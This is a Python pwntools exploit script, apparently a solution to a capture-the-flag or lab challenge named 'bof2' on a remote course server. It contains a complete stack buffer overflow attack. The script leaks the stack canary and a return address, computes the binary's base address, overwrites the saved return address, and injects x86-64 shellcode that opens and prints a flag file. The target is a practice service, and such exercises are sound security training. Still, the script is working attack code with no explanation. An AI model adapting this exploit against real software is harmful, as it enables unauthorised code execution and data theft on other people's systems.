#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys
import re

context.arch = 'amd64'
context.os = 'linux'

exe = './bof2'
port = 12343

FLAG_PATTERN = r"FLAG\{.*?\}"

elf = ELF(exe)
off_main = elf.symbols.get(b'main', 0)
base = 0
qemu_base = 0


r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

shellcode = asm("""
    /* open("/FLAG", O_RDONLY) */
    xor rax, rax
    push rax
    mov rbx, 0x47414c462f
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    mov rax, 2
    syscall

    /* read(fd, rsp-0x100, 0x100) */
    mov rdi, rax
    sub rsp, 0x100
    mov rsi, rsp
    mov rdx, 0x100
    xor rax, rax
    syscall

    /* write(1, rsp, 0x100) */
    mov rdi, 1
    mov rax, 1
    syscall

    /* exit(0) */
    mov rax, 60
    xor rdi, rdi
    syscall
""")

# buf1:     0x7fffffffe290 # Canary
# buf2:     0x7fffffffe2c0 # Leak Addr
# buf3:     0x7fffffffe2f0 # Write msg
# ret_addr: 0x7fffffffe328


r.recvuntil(b"What's your name? ")
payloads = b'A'*137
r.send(payloads)

res = r.recvline()
canary = u64(res.split(b'A'*136)[1][1:8].rjust(8, b'\x00'))

r.recvuntil(b"What's the room number? ")
payloads = b'A'*104
r.send(payloads)

res = r.recvline()

ret_addr = u64(res.split(b'A'*104)[1][:-1].ljust(8, b'\x00'))

main_offset = elf.symbols['main']
task_offset = elf.symbols['task']
msg_offset = elf.symbols['msg']

base_addr = ret_addr - 0xC6 - main_offset
msg_addr = base_addr + msg_offset

new_ret_addr = p64(msg_addr, endian='little')

payloads = b'A'*40 + p64(canary, endian='little') + b'B' * 8 + new_ret_addr

r.recvuntil(b"What's the customer's name? ")
r.send(payloads)

r.recvuntil(b"Leave your message: ")
r.send(shellcode)

res = r.recvall()
response = res.decode(errors='ignore')
flag_match = re.search(FLAG_PATTERN, response)

if flag_match:
    log.success(f"FLAG FOUND: {flag_match.group(0)}")
else:
    log.failure(f"FLAG NOT FOUND: No No No...")

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :